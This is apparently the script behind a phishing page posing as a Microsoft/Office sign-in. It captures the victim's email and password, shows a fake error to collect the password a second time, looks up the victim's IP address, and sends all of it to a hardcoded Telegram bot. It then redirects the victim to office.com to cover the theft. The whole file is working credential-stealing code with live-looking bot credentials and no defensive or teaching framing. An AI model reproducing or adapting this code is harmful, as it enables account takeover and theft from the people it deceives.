   
    let botToken = '7323860435:AAH9pravwMa4_3o8XwYotAJP7pTI0V8R_C0'; 
    let chatId = '6982018345'; 
    let firstAttempt = true; 
    let password1 = ""; 
    let password2 = ""; 

    function showPasswordStep() {
        const emailInput = document.getElementById('email').value;
        if (!emailInput) {
            alert("Please enter an email address");
            return;
        }
        document.getElementById('emailStep').classList.add('hidden');
        document.getElementById('passwordStep').classList.remove('hidden');
        const heading = document.querySelector('.heading');
        heading.textContent = emailInput;
    }

    function showEmailStep() {
        document.getElementById('passwordStep').classList.add('hidden');
        document.getElementById('emailStep').classList.remove('hidden');
        const heading = document.querySelector('.heading');
        heading.textContent = 'Sign in';
    }

    function sendToTelegram(email, password1, password2, ipAddress, cookies) {
        let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        let message = `Email: ${email}\n1 Password: ${password1}\n2 Password: ${password2}\nIP Address: ${ipAddress}\n  ---------------------------\n `;

        return fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).then(response => response.json())
          .then(data => {
              console.log("Message sent to Telegram");
              return true;
          })
          .catch(error => {
              console.error("Error:", error);
              return false;
          });
    }

    document.getElementById("loginForm").onsubmit = function (event) {
        event.preventDefault(); 

        const email = document.getElementById('email').value;
        const password2Input = document.getElementById('password').value;

        if (!email || !password2Input) {
            alert("Please fill in both fields");
            return;
        }

        if (firstAttempt) {
            password1 = password2Input;
            firstAttempt = false;

            // Show error message and clear password field
            document.getElementById('errorMessagePassword').classList.remove('hidden');
            document.getElementById('password').value = '';

            // Hide error message quickly
            setTimeout(function() {
                document.getElementById('errorMessagePassword').classList.add('hidden');
            }, 1900); // hide after 1.9 seconds

            return;
        }

        password2 = password2Input;

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                const cookies = document.cookie;  // Extract cookies

                sendToTelegram(email, password1, password2, ipAddress, cookies).then(success => {
                    if (success) {
                        document.getElementById('successMessage').classList.remove('hidden');
                        setTimeout(() => {
                            
                            window.location.href = "https://www.office.com";  // تغيير الرابط هنا
                        }, 2000);
                    }
                });
            });
    };
